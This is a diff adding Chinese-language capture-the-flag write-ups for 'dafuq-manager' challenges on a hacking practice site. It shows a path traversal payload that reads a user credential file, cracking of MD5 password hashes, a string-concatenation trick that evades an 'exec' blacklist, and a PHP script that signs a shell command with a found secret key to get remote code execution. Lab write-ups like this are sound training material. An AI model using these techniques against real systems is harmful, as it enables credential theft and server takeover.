@@ -310,6 +310,36 @@ s155964671a
 
 創建並重新載入後他便問你是否會修改cookie，此時會發現cookie中有一個show hidden的cookie，把value改為yes就可以了。
 
+## 32 dafuq-manager 2
+在edit file的地方發現他直接將檔案位置已get參數傳遞，嘗試將參數改為".\./.\./.config/.htusers.php"就可以看到user的帳號及密碼。
+
+不過密碼是被md5雜湊過的，這裡可以使用[CrackStation](https://crackstation.net/)這個工具來還原
+
+## 33 dafuq-manager 3
+這題他告訴你要使用到shell，在程式碼中找了一下發現"debug.php"中有"exec"的相關字眼，所以應該是要從這邊來開始進行。
+
+一開始先將首頁的action改為debug後進入debug頁面
+
+接著修改"dir"參數來避開"You are not hacky enough :("錯誤，可使用dir[]=0
+
+接著最後就是要輸入指令了，但是exec在黑名單中，不過php可藉由字串來呼叫函式，因此可使用下列指令
+```php=
+$command = '$a = "ex"; $b = "ec"; $c = $a.$b; echo $c("cd /var/www/webhdisk/flag3/ && ./meow ./flag3");';
+```
+下一步是要知道他加密所使用的key，但這不困難，可以在.config裡的conf.php中找到
+
+最後可以編寫出以下的script
+```php=
+<?php
+$command = '$a = "ex"; $b = "ec"; $c = $a.$b; echo $c("cd /var/www/webhdisk/flag3/ && ./meow ./flag3");';
+$secret_key = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
+$hmac = hash_hmac('sha256', $command, $secret_key);
+$url='https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&dir[]=1&command='.urlencode(base64_encode($command) . ".".$hmac).'<br/>';
+echo $url;
+?>
+```
+
+
 # Reversing
 ## 41 helloworld
 打開程式之後要輸入一串正確的數字，反編譯過後發現程式會將輸入與12B9B0A1進行比較，把他轉為十進位後輸入就可以了。
